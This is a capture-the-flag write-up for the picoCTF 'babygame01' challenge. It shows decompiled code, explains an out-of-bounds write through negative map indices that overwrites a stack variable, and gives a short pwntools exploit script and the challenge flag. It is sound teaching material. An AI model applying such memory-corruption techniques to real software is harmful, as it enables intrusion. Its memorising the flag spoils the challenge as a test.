# babygame01
Points: 100

The challenge provides a single 32-bit unstripped x86 binary.

As always, the first step is to run checksec and ghidra.
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

decompiled `main`:
```c
undefined4 main(void) {
   int iVar1;
   undefined4 uVar2;
   int in_GS_OFFSET;
   int local_aac;
   int local_aa8;
   char local_aa4;
   undefined local_aa0 [2700];
   int local_14;
   undefined *local_10;

   local_10 = &stack0x00000004;
   local_14 = *(int *)(in_GS_OFFSET + 0x14);
   init_player(&local_aac);
   init_map(local_aa0,&local_aac);
   print_map(local_aa0,&local_aac);
   signal(2,sigint_handler);
   do {
      do {
         iVar1 = getchar();
         move_player(&local_aac,(int)(char)iVar1,local_aa0);
         print_map(local_aa0,&local_aac);
      } while (local_aac != 0x1d);
   } while (local_aa8 != 0x59);
   puts("You win!");
   if (local_aa4 != '\0') {
      puts("flage");
      win();
      fflush(stdout);
   }
   uVar2 = 0;
   if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
      uVar2 = __stack_chk_fail_local();
   }
   return uVar2;
}
```

`init_player` writes 4 to local_aac and local_aa8, which represent the players x and y position in the map. It also writes 0 to local_aa4.

`init_map` fills the 90 by 30 map with `.`, and proceeds to place a `@` for the player and an `X` for the target.

`print_map` does exactly what the name indicates.

`win` outputs the flag.

We can see that `main` only terminates when the player position reaches <0x59, 0x1d>, and once
it terminates it only outputs the flag if local_aa4 is **NOT** zero. Remember that local_aa4 is
initialized to zero at the beginning of the program. In order to get the flag, we will have to
somehow overwrite local_aa4 and then move the player to <0x59, 0x1d>.

There is one last function I have not mentioned yet, which is `move_player`
```c
void move_player(int *param_1,char param_2,int param_3) {
   int iVar1;

   if (param_2 == 'l') {
      iVar1 = getchar();
      player_tile = (undefined)iVar1;
   }
   if (param_2 == 'p') {
      solve_round(param_3,param_1);
   }
   *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = 0x2e;
   if (param_2 == 'w') {
      *param_1 = *param_1 + -1;
   }
   else if (param_2 == 's') {
      *param_1 = *param_1 + 1;
   }
   else if (param_2 == 'a') {
      param_1[1] = param_1[1] + -1;
   }
   else if (param_2 == 'd') {
      param_1[1] = param_1[1] + 1;
   }
   *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = player_tile;
   return;
}
```
Here we can see they `move_player` adjusts the player position based on wasd, writes the player
char to the new position, and overwrites the old position with `.`. The `p` input simply moves
the player to <0x5a, 0x1d>, and `l` does not matter for this challenge.

The exploit is as follows, we can abuse the fact that the map and local_aa4 are both stored on the
stack, and move the player to a negative index such that it clobbers local_aa4 and gives us the
flag.

```python
from pwn import *

port = [insert port here]
io = remote("saturn.picoctf.net", port)

io.sendline(b"w" * 4)
io.sendline(b"a" * 4)
io.sendline(b"a" * 4)
io.sendline(b"p")

io.interactive()
```

# Flag: `picoCTF{gamer_m0d3_enabled_054c1d5a}`